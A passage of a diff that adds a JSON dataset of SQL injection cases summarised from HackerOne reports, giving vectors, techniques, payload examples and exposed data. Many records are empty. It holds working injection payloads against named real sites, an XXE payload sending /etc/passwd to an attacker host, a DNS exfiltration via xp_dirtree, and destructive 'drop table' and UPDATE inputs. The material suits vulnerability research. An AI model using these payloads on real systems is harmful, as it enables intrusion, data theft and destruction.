@@ -1,0 +1,2001 @@
+{
+  "description": "SQL Injection Cases (src: HackerOne)",
+  "vulnerability_type": "sqli",
+  "total_cases": 198,
+  "cases": [
+    {
+      "injection_vector": "req.body.loginEmail parameter in MongoDB query",
+      "database_type": "MongoDB",
+      "injection_type": "NoSQL Injection via $regex operator (MongoDB injection)",
+      "extraction_method": "Using a Python script exploiting the $regex operator to test each character of emails recursively via the customer login",
+      "payload_example": "{email: {$regex: 'pattern'}} (implied usage in the Python exploit script)",
+      "data_exposed": [
+        "customer emails",
+        "administrator emails"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": "boolean",
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "pub_group_id",
+      "database_type": null,
+      "injection_type": "Time-based",
+      "extraction_method": "Using sleep() function to cause delay in response time",
+      "payload_example": "GET /pubs/move_papers.php?pub_group_id=a'%2b(select*from(select(sleep(5)))a)%2b' HTTP/1.1",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "parameter in URL query string (e.g., ?1=...)",
+      "database_type": "Oracle",
+      "injection_type": "Error-based SQL injection",
+      "extraction_method": "Using Oracle PL/SQL functions (OWA_UTIL.CELLSPRINT, HTP.PRINT) to extract data via SQL injection",
+      "payload_example": "http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+banner+FROM+v$version",
+      "data_exposed": [
+        "Oracle database version banner",
+        "Oracle database usernames (from ALL_USERS)",
+        "Cross Site Scripting (XSS) via SQL injection"
+      ]
+    },
+    {
+      "injection_vector": "v parameter in GET /assets/icons/",
+      "database_type": null,
+      "injection_type": "Blind Text Injection Differential",
+      "extraction_method": "UNION SELECT from information_schema.tables",
+      "payload_example": "GET /assets/icons/?v=9wr1emhXD568%3B'%20UNION%20SELECT%208%2C%20table_name%2C%20'vega'%20FROM%20information_schema.tables%20WHERE%20table_name%20like'%25",
+      "data_exposed": [
+        "table_name"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "querying for users on the lookup server",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "increments.vote() function parameter",
+      "database_type": "MySQL",
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": "'Oranges\",\"0\",\"0\",\"1\",\"0\",\"0\",\"0\",\"0\",\"\",\"0\")',(123,\"Oranges\",\"0\",\"0\",\"1\",\"0\",\"0\",\"0\",\"0\",\"\",\"0\").repeat(10)#",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "parameter REPORT",
+      "database_type": null,
+      "injection_type": "Error-based",
+      "extraction_method": null,
+      "payload_example": "https://trac.torproject.org/projects/tor/query?status=closed&report=1'",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "POST parameter 'groups' in /include/findusers.php",
+      "database_type": null,
+      "injection_type": "Boolean-based SQL Injection",
+      "extraction_method": "Boolean-based SQL Injection attacks to read sensitive data",
+      "payload_example": null,
+      "data_exposed": [
+        "users' email addresses",
+        "password hashes",
+        "any field of the 'users' database table"
+      ]
+    },
+    {
+      "injection_vector": "log parameter",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "authentication and authorization bypass",
+        "entire database contents",
+        "OS command execution"
+      ]
+    },
+    {
+      "injection_vector": "MSI_additionalFilterType1",
+      "database_type": "Oracle Database 11g Enterprise Edition Release 11.2.0.3.0 - 64bit Production",
+      "injection_type": "Time based blind SQL injection",
+      "extraction_method": "Time based blind SQL injection using sqlmap with adjusted parameters and time delays",
+      "payload_example": null,
+      "data_exposed": [
+        "database user",
+        "database name (schema)",
+        "table names"
+      ]
+    },
+    {
+      "injection_vector": "partner id field on https://www.teavana.com (Sign-up form)",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "authentication and authorization bypass",
+        "entire database contents",
+        "add, modify and delete records",
+        "OS command execution"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "User-Agent header",
+      "database_type": "MySQL 8 (MariaDB fork)",
+      "injection_type": "Boolean-based Blind SQL Injection",
+      "extraction_method": "Using boolean-based blind SQL injection techniques with tools like sqlmap and Burp Suite to infer database information",
+      "payload_example": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/523.10.3 (KHTML, like Gecko) Version/3.0.4 Safari/523.10' AND 8074=8074-- KwOG",
+      "data_exposed": [
+        "database schema details",
+        "potentially sensitive information"
+      ]
+    },
+    {
+      "injection_vector": "query() method on exposed FileContentProvider",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": "Bypassing query restrictions to access any table defined in filelist.db",
+      "payload_example": null,
+      "data_exposed": [
+        "any table defined in filelist.db (full disclosure)"
+      ]
+    },
+    {
+      "injection_vector": "cookie parameter 'lang'",
+      "database_type": null,
+      "injection_type": "Error-based and Time-based",
+      "extraction_method": "Error messages from single quote injection; time delay using sleep function",
+      "payload_example": "'; %2b(select*from(select(sleep(20)))a)%2b",
+      "data_exposed": [
+        "table names"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": "Error-based",
+      "extraction_method": "Using SQLMap to extract data from the database",
+      "payload_example": null,
+      "data_exposed": [
+        "database names"
+      ]
+    },
+    {
+      "injection_vector": "https:/[REDACTED]/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z",
+      "database_type": null,
+      "injection_type": "Blind, Time-based",
+      "extraction_method": "Time delay (sleep) to infer true/false conditions",
+      "payload_example": "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z",
+      "data_exposed": [
+        "authentication and authorization data",
+        "entire database contents",
+        "database records (add, modify, delete)",
+        "potential OS command execution"
+      ]
+    },
+    {
+      "injection_vector": "[REDACTED] parameter in https://[REDACTED]/[REDACTED]",
+      "database_type": "MySQL",
+      "injection_type": "Time-based and Error-based SQL Injection",
+      "extraction_method": "Time delay using SLEEP(10) and error message using updatexml() function to reveal MySQL version",
+      "payload_example": "[REDACTED]=K*' OR SLEEP(10) AND 'aSgl'='aSgl",
+      "data_exposed": [
+        "emails",
+        "usernames",
+        "passwords",
+        "admin credentials"
+      ]
+    },
+    {
+      "injection_vector": "refresh_token parameter sent to the REST path /api/v1/token",
+      "database_type": null,
+      "injection_type": "Blind SQL injection, Time-based",
+      "extraction_method": "Time delay using WAITFOR DELAY command to infer SQL injection vulnerability",
+      "payload_example": "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:13'--",
+      "data_exposed": [
+        "data from the FTP server",
+        "authentication bypass",
+        "potential remote code execution"
+      ]
+    },
+    {
+      "injection_vector": [
+        "Entries to display on frontpage (used as $serendipity['fetchLimit'])",
+        "Entries to display in Feeds (used as $serendipity['RSSfetchLimit'])",
+        "Parameters $limit, $order, $type, or $where in serendipity_fetchComments function when user-controlled"
+      ],
+      "database_type": null,
+      "injection_type": "Error-based",
+      "extraction_method": "Altering configuration fields with non-numeric characters to break query correctness and cause error messages; possibility to extract arbitrary database records via crafted payloads",
+      "payload_example": null,
+      "data_exposed": [
+        "Database records",
+        "Files on the underlying system"
+      ]
+    },
+    {
+      "injection_vector": "city parameter in /webapi/searchapi.php",
+      "database_type": null,
+      "injection_type": "Blind injection",
+      "extraction_method": null,
+      "payload_example": "/webapi/searchapi.php?city=51\\{!dismax}",
+      "data_exposed": [
+        "all data within the Solr cluster"
+      ]
+    },
+    {
+      "injection_vector": "login form of a Sony endpoint",
+      "database_type": null,
+      "injection_type": "error-based",
+      "extraction_method": "SQLMap used to enumerate database names after intercepting login request with BurpSuite",
+      "payload_example": null,
+      "data_exposed": [
+        "database names"
+      ]
+    },
+    {
+      "injection_vector": "username",
+      "database_type": "MySQL >= 5.0.12 (MariaDB fork)",
+      "injection_type": "boolean-based blind, time-based blind",
+      "extraction_method": "time-based blind SQL injection using SLEEP function; boolean-based blind injection",
+      "payload_example": "username=' OR 4924=4924 OR 'XiUq'='JgnT",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "/plugin/tag/ parameter (the tag value in the URL)",
+      "database_type": null,
+      "injection_type": "Blind SQL Injection, Time-based",
+      "extraction_method": "Timing server response delays using sleep() function in SQL payloads",
+      "payload_example": "if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'\"XOR(if(now()=sysdate(),sleep(3),0))OR\"*/",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "rcnum parameter in personnel.php (e.g. /personnel.php?content=profile&rcnum=*)",
+      "database_type": null,
+      "injection_type": "Boolean-based Blind SQL Injection",
+      "extraction_method": "Boolean-based blind technique using conditional statements in SQL payloads to infer data (e.g., substr(database(),1,1)='c') and order by to enumerate columns",
+      "payload_example": "GET /personnel.php?content=profile&rcnum=rc12346'+++and+(select++substr(database(),1,1)++=++'c')+and+'1'='1 HTTP/1.1",
+      "data_exposed": [
+        "Database name",
+        "Number of columns in current table"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "data"
+      ]
+    },
+    {
+      "injection_vector": "/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999 or 1=1-- (the 'number_trips' parameter in the URL path)",
+      "database_type": "PostgreSQL",
+      "injection_type": "Blind SQL injection",
+      "extraction_method": "Using conditional responses to infer data (true/false conditions in injected SQL)",
+      "payload_example": "/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999 or 1=1--",
+      "data_exposed": [
+        "SQL version",
+        "Database entries (random entries from the database)"
+      ]
+    },
+    {
+      "injection_vector": "SOAP WSDL Parser via tampered SOAP Admin Panel requests",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": "Parsing WSDL resources and repeating SQL queries with custom SQL commands in tampered requests",
+      "payload_example": null,
+      "data_exposed": [
+        "database names",
+        "admin panel access",
+        "entire DoD Information System"
+      ]
+    },
+    {
+      "injection_vector": "[REDACTED]",
+      "database_type": "MySQL",
+      "injection_type": "Error-based",
+      "extraction_method": "Using updatexml() function to trigger error messages that reveal database information",
+      "payload_example": "https://[REDACTED]/[REDACTED]=' and updatexml(null,concat(0x0a,version()),null)-- -@hackerone.mil",
+      "data_exposed": [
+        "Database version",
+        "Database user",
+        "Database name",
+        "Potentially entire database contents"
+      ]
+    },
+    {
+      "injection_vector": "log parameter in POST request to /wp-login.php",
+      "database_type": null,
+      "injection_type": "Time-based Blind SQL Injection",
+      "extraction_method": "Using time delay functions (sleep) to infer true/false conditions",
+      "payload_example": "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
+      "data_exposed": [
+        "Authentication bypass",
+        "Database contents (potentially entire database)",
+        "Ability to add, modify, delete records"
+      ]
+    },
+    {
+      "injection_vector": "User-agent",
+      "database_type": "MySQL",
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "limit parameter on user facing APIs (specifically oc:filter-comments.oc:limit#text in /remote.php/dav/comments/files/1985)",
+      "database_type": null,
+      "injection_type": "Error-based",
+      "extraction_method": null,
+      "payload_example": "1'",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "scn",
+      "database_type": "MySQL",
+      "injection_type": "boolean-based blind, error-based, time-based blind",
+      "extraction_method": "Using sqlmap with boolean-based blind, error-based, and time-based blind techniques including SLEEP function for time delays",
+      "payload_example": "COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x5648745a FROM DUAL WHERE 7300=7300 AND 1308=1308)||'",
+      "data_exposed": [
+        "database names",
+        "information_schema",
+        "plugin information",
+        "potentially all data accessible via SQL queries"
+      ]
+    },
+    {
+      "injection_vector": "after_html parameter with [display-frm-data] shortcode parameters 'order_by' and 'order'",
+      "database_type": null,
+      "injection_type": "Blind SQL injection (via manipulation of ORDER BY clause to control entry order and infer data)",
+      "extraction_method": "Controlling the order of entries appearing on the page to communicate one bit of data from the database",
+      "payload_example": "action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=zzz]YYY",
+      "data_exposed": [
+        "form entries data stored in WordPress database"
+      ]
+    },
+    {
+      "injection_vector": "coupon_codes",
+      "database_type": null,
+      "injection_type": "Time-based",
+      "extraction_method": "Response delay observed due to sleep(10) function in SQL payload",
+      "payload_example": "')+union+select+1,sleep(10)--+-",
+      "data_exposed": [
+        "sensitive data"
+      ]
+    },
+    {
+      "injection_vector": "validateemail",
+      "database_type": "MySQL 5.0.11",
+      "injection_type": "Time-based",
+      "extraction_method": "sqlmap scan",
+      "payload_example": "test@yopmail.com' or sleep(5) #",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "from",
+      "database_type": "Microsoft SQL Server",
+      "injection_type": "Error-based / Blind (out-of-band)",
+      "extraction_method": "Out-of-band DNS exfiltration using xp_dirtree to trigger DNS lookup to attacker-controlled domain",
+      "payload_example": "';declare @q varchar(99);set @q='\\\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net/random'; exec master.dbo.xp_dirtree @q;--",
+      "data_exposed": [
+        "Database information",
+        "Execution of arbitrary SQL commands"
+      ]
+    },
+    {
+      "injection_vector": "res_id parameter in /php/widgets_handler.php?method=getResWidgetButton",
+      "database_type": null,
+      "injection_type": "Blind SQL Injection (Time-based)",
+      "extraction_method": "Time delay using SLEEP function to infer data",
+      "payload_example": "/php/widgets_handler.php?method=getResWidgetButton&res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": "Time-based",
+      "extraction_method": "Time-based SQL injection to disclose database names",
+      "payload_example": null,
+      "data_exposed": [
+        "database names",
+        "hashed passwords",
+        "Uber partner information"
+      ]
+    },
+    {
+      "injection_vector": "sortBy parameter",
+      "database_type": null,
+      "injection_type": "Time-based blind SQL injection",
+      "extraction_method": "Observing server response delays by injecting WAITFOR DELAY commands and measuring response time differences",
+      "payload_example": "IF (SUBSTRING(DB_NAME(), 1, 1) = 'A') WAITFOR DELAY '00:00:05'; --",
+      "data_exposed": [
+        "usernames",
+        "passwords",
+        "database name",
+        "table names",
+        "column names",
+        "records stored in the database"
+      ]
+    },
+    {
+      "injection_vector": "MSI_queryType",
+      "database_type": "Oracle 11g",
+      "injection_type": "Time-based blind SQL injection",
+      "extraction_method": "Using sqlmap to process captured POST request and identify DBMS and user privileges",
+      "payload_example": null,
+      "data_exposed": [
+        "Database type",
+        "Database user account with DBA rights",
+        "Potential to read and write database information",
+        "Potential to execute commands as database user"
+      ]
+    },
+    {
+      "injection_vector": "url parameter",
+      "database_type": null,
+      "injection_type": "Time-based SQL injection",
+      "extraction_method": "Inducing time delay using Benchmark() function in SQL queries",
+      "payload_example": "videos.websummit.net?url=if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": "MySQL",
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "GET method parameter in URL path (e.g. translations/videos/en' or '1'=='1_youtube_stats.csv)",
+      "database_type": null,
+      "injection_type": "Boolean-based SQL Injection",
+      "extraction_method": "Boolean condition in URL to retrieve different CSV files based on true/false evaluation",
+      "payload_example": "https://www.khanacademy.org/translations/videos/en'%20or'1'=='1_youtube_stats.csv",
+      "data_exposed": [
+        "CSV files (e.g. youtube_stats.csv)"
+      ]
+    },
+    {
+      "injection_vector": "user_id parameter in the unsubscribe link",
+      "database_type": "MySQL",
+      "injection_type": "Time-based Blind SQL Injection",
+      "extraction_method": "Time delay (sleep) based blind SQL injection with iterative character extraction using mid() function",
+      "payload_example": "http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=eyJ1c2VyX2lkIjogIjU3NTUgYW5kIHNsZWVwKDEyKT0xIiwgInJlY2VpdmVyIjogIm9yYW5nZUBteW1haWwifQ==",
+      "data_exposed": [
+        "MySQL username",
+        "Database name"
+      ]
+    },
+    {
+      "injection_vector": "invite_code",
+      "database_type": "PostgreSQL",
+      "injection_type": "Time-based Blind SQL Injection",
+      "extraction_method": "Using SQLMap to enumerate database and tables",
+      "payload_example": "invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(5))--",
+      "data_exposed": [
+        "database name",
+        "table names"
+      ]
+    },
+    {
+      "injection_vector": "limit and offset parameters in SQL query building",
+      "database_type": null,
+      "injection_type": "Classic / In-Band",
+      "extraction_method": "Observed constructed SQL queries",
+      "payload_example": "'1; drop table users'",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "MainAccount XML node in XML-formatted HTTP payload requests",
+      "database_type": "Microsoft SQL Server 2012",
+      "injection_type": "Time-based SQL injection",
+      "extraction_method": "Automated attack using sqlmap with --tamper htmlencode flag",
+      "payload_example": "<MainAccount>123456&apos;</MainAccount>",
+      "data_exposed": [
+        "Enterprise Accounting data",
+        "Financial data",
+        "Payroll data"
+      ]
+    },
+    {
+      "injection_vector": "URL path processing on www.ibm.com, specifically a single quote right after the leading slash in the path",
+      "database_type": null,
+      "injection_type": "Blind SQL injection",
+      "extraction_method": "Boolean error-based exfiltration technique using differences in server response (endless redirect vs status 500)",
+      "payload_example": "A single quote (') right after the leading slash in the URL path",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": ".values() method with user input in JSONField KeyTransform",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "admin email password reset token request parameter (using regex search)",
+      "database_type": null,
+      "injection_type": "Blind SQL injection (regex search)",
+      "extraction_method": "Python script exploiting blind SQL injection with regex search to retrieve admin reset token",
+      "payload_example": null,
+      "data_exposed": [
+        "admin reset token",
+        "admin email",
+        "admin password reset capability"
+      ]
+    },
+    {
+      "injection_vector": "tile ID parameter to the tile zoom script",
+      "database_type": null,
+      "injection_type": "Time-based",
+      "extraction_method": "Using a benchmark function causing a delay to infer data",
+      "payload_example": "https://staging.uzbey.com/zoom-image/BENCHMARK(10000000,SHA1(1))",
+      "data_exposed": [
+        "database name",
+        "table name",
+        "column name",
+        "internal database information"
+      ]
+    },
+    {
+      "injection_vector": "inc/ajax-actions-frontend.php",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "id parameter in the return_url query string",
+      "database_type": "MongoDB (NoSQL)",
+      "injection_type": "Blind SQL Injection (time-based)",
+      "extraction_method": "Using time delay functions like sleep(5) and benchmark() to confirm injection",
+      "payload_example": "id=291751-sleep(5)&hash=f42ffae0449536cfd0419826f3adf136",
+      "data_exposed": [
+        "user lists",
+        "entire tables (deletion)",
+        "administrative rights to database"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "search function",
+      "database_type": null,
+      "injection_type": "Error-based",
+      "extraction_method": "By causing the application to display unintended detailed error messages containing error codes",
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "seqno",
+      "database_type": null,
+      "injection_type": "Blind",
+      "extraction_method": "Boolean-based blind SQL injection using DECODE function",
+      "payload_example": "seqno-DECODE(lpad(user,5),'QSWEB',1,1/0)",
+      "data_exposed": [
+        "authentication credentials",
+        "authorization data",
+        "entire database contents",
+        "database records (add, modify, delete)",
+        "potential OS command execution"
+      ]
+    },
+    {
+      "injection_vector": "/██████/library.php?c=G14 parameter",
+      "database_type": null,
+      "injection_type": "Time Based",
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "http://www.starbucks.com.gt/menu/beverage/detail",
+      "database_type": null,
+      "injection_type": "Blind SQL Injection",
+      "extraction_method": "Dumping schema on several database tables using blind SQL injection",
+      "payload_example": null,
+      "data_exposed": [
+        "database schema",
+        "table names",
+        "field names"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": "crafting specially formatted URLs",
+      "payload_example": null,
+      "data_exposed": [
+        "sensitive information"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": "crafting specially formatted URLs",
+      "payload_example": null,
+      "data_exposed": [
+        "sensitive information"
+      ]
+    },
+    {
+      "injection_vector": "API endpoint WSDL service functions (unauthenticated)",
+      "database_type": null,
+      "injection_type": "Blind SQL Injection",
+      "extraction_method": "Blind SQLi allowing database access and command execution via xp_cmdshell",
+      "payload_example": "Using xp_cmdshell to execute 'ping' command",
+      "data_exposed": [
+        "users",
+        "passwords",
+        "personal information"
+      ]
+    },
+    {
+      "injection_vector": "search parameter",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": "Dumped table names from one of the databases via SQL injection",
+      "payload_example": "' (a quote character used in the search bar to trigger the error)",
+      "data_exposed": [
+        "users",
+        "password_resets",
+        "table names"
+      ]
+    },
+    {
+      "injection_vector": "id parameter in /people-rater/entry endpoint (base64 encoded JSON string)",
+      "database_type": null,
+      "injection_type": "Insecure direct object reference / IDOR via manipulated base64 encoded id parameter",
+      "extraction_method": "Modifying the base64 encoded id parameter from {\"id\":2} to {\"id\":1} to access hidden data",
+      "payload_example": "id=eyJpZCI6MX0= (base64 for {\"id\":1})",
+      "data_exposed": [
+        "User ratings",
+        "User names",
+        "Flags"
+      ]
+    },
+    {
+      "injection_vector": "get_publications.php",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": "crafting specially formatted URLs",
+      "payload_example": null,
+      "data_exposed": [
+        "sensitive information"
+      ]
+    },
+    {
+      "injection_vector": "ccm_order_by and ccm_order_by_direction parameters in the URL",
+      "database_type": null,
+      "injection_type": "Error-based or Union-based (implied by ability to execute UPDATE statement)",
+      "extraction_method": "Direct SQL injection via URL parameter allowing execution of arbitrary SQL commands",
+      "payload_example": "http://172.20.0.49/conc/index.php/ccm/system/search/users/submit?&ccm_order_by=u.uEmail&ccm_order_by_direction=desc;UPDATE%20%60conc501%60.%60Users%60%20SET%20%60uEmail%60%20=%20%27user@evilhost%27%20WHERE%20%60users%60.%60uID%60%20=%202;--",
+      "data_exposed": [
+        "user email addresses"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "direction parameter",
+      "database_type": "MySQL",
+      "injection_type": "Time-based",
+      "extraction_method": "Time delay (time-based blind SQL injection)",
+      "payload_example": null,
+      "data_exposed": [
+        "sensitive information"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "staff_student (POST parameter)",
+      "database_type": "MySQL",
+      "injection_type": "boolean-based blind, time-based blind",
+      "extraction_method": "Using sqlmap automated tool with boolean-based blind and time-based blind techniques",
+      "payload_example": "staff_student=STUDENT'||(SELECT 0x6545736f FROM DUAL WHERE 6919=6919 AND 4128=4128)||&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit Comments",
+      "data_exposed": [
+        "database names",
+        "information_schema",
+        "performance_schema",
+        "user databases (e.g., testusers, testadmin, test)"
+      ]
+    },
+    {
+      "injection_vector": [
+        "where key names (e.g. where['age=25 OR 25='])",
+        "opts['take'] (limit)",
+        "opts['skip'] (offset)",
+        "opts['order']",
+        "orderBy clause in createQueryBuilder"
+      ],
+      "database_type": "sqlite",
+      "injection_type": "Classic / In-Band",
+      "extraction_method": "Using unescaped LIMIT/OFFSET and ORDER BY clauses to extract data via subqueries",
+      "payload_example": "opts[\"take\"] = '(SELECT case when SUBSTR(lastName,1,1) = \"S\" then 1 else 0 end from user where age = 25 limit 1)';",
+      "data_exposed": [
+        "lastName",
+        "age",
+        "user table data"
+      ]
+    },
+    {
+      "injection_vector": "files.xml loaded from AWS S3 bucket subdomain (h1-XXXXXX.eu-west-2.amazonaws.com/files.xml) used in user profile page",
+      "database_type": null,
+      "injection_type": "XXE (XML External Entity) attack",
+      "extraction_method": "Out-of-band (OOB) data exfiltration via HTTP request to attacker-controlled server with base64 encoded file content",
+      "payload_example": "<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://IP:8082/?x=%file;'>\">\n%eval;\n%exfil;",
+      "data_exposed": [
+        "/etc/passwd file contents",
+        "potentially other sensitive files on the server"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "usernames",
+        "password hashes"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "JSON POST parameter \"docId\"",
+      "database_type": "MS SQL Server 2008",
+      "injection_type": "Blind SQL Injection",
+      "extraction_method": "Blind technique using substring function on @@version to extract data character by character",
+      "payload_example": "docId:\"1 and (select substring(@@version,1,1))='M'\"",
+      "data_exposed": [
+        "Database version information"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": "crafting specially formatted URLs",
+      "payload_example": null,
+      "data_exposed": [
+        "sensitive information"
+      ]
+    },
+    {
+      "injection_vector": "t parameter in viewVideo.asp",
+      "database_type": null,
+      "injection_type": "Time-based Blind SQL Injection",
+      "extraction_method": "Observing time delay in server response when injecting pg_sleep() function",
+      "payload_example": "viewVideo.asp?t=pg_sleep(30)--",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "Content Provider URI 'content://org.nextcloud/' with vulnerable projection and selection parameters",
+      "database_type": "SQLite",
+      "injection_type": "Error-based SQL Injection",
+      "extraction_method": "Using Drozer to run queries via the content provider and observing SQL error messages; querying SQLite master table to enumerate tables",
+      "payload_example": "' (single quote) used in projection parameter causing SQL error: SELECT ' FROM filelist ORDER BY filename collate nocase asc",
+      "data_exposed": [
+        "Table names (e.g., android_metadata, filelist)",
+        "Potentially all data accessible via the filelist table and other tables in the database"
+      ]
+    },
+    {
+      "injection_vector": "phone_number parameter via POST request",
+      "database_type": null,
+      "injection_type": "Blind SQL Injection (Time-based)",
+      "extraction_method": "Time delay using sleep() function to infer data",
+      "payload_example": "phone_number=0'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z&pin=1&submit=Continuar",
+      "data_exposed": [
+        "authentication bypass",
+        "authorization bypass",
+        "entire database contents",
+        "ability to add, modify, delete records",
+        "potential OS command execution"
+      ]
+    },
+    {
+      "injection_vector": "username parameter in fetchById function",
+      "database_type": "MySQL",
+      "injection_type": "Classic SQL Injection (Boolean-based / tautology)",
+      "extraction_method": "Injecting tautology condition ('noob' or 1=1--) to fetch all records",
+      "payload_example": "noob' or 1=1-- ",
+      "data_exposed": [
+        "username",
+        "password"
+      ]
+    },
+    {
+      "injection_vector": "userid parameter in POST /elist/email_aba.php",
+      "database_type": null,
+      "injection_type": "Time-based Blind SQL Injection",
+      "extraction_method": "Using time delay via sleep() function to infer true/false conditions",
+      "payload_example": "userid=admin'+(select*from(select(sleep(3)))a)+'",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "search (GET parameter)",
+      "database_type": "MySQL >= 5.0.12",
+      "injection_type": "AND/OR time-based blind",
+      "extraction_method": "Time-based blind SQL injection using SLEEP() function",
+      "payload_example": "limit=10&offset=20&organization_id=88822&search=0' AND SLEEP(5) AND 'wRIg' LIKE 'wRIg&sort=",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "WPML module in a Wordpress blog plugin on love.uber.com",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "password hashes"
+      ]
+    },
+    {
+      "injection_vector": "phone_number",
+      "database_type": null,
+      "injection_type": "Time-based Blind SQL Injection",
+      "extraction_method": "Time delay using sleep() function to infer true/false conditions",
+      "payload_example": "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z",
+      "data_exposed": [
+        "usernames"
+      ]
+    },
+    {
+      "injection_vector": [
+        "POST parameter 'hdnParentID' in plugins/q-and-a/inc/reorder.php",
+        "POST parameter 'pages' in plugins/q-and-a/inc/reorder.php"
+      ],
+      "database_type": "MySQL",
+      "injection_type": "Time-based Blind SQL Injection",
